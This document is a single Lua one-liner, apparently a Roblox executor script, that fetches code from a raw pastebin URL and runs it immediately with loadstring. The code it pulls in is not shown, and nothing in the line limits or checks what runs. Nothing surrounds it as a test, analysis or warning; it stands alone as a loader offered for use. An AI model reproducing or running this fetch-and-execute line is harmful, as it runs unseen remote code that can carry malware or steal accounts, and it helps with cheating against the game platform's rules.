loadstring(game:HttpGet("https://pastebin.com/raw/YvBKNpfk"))()
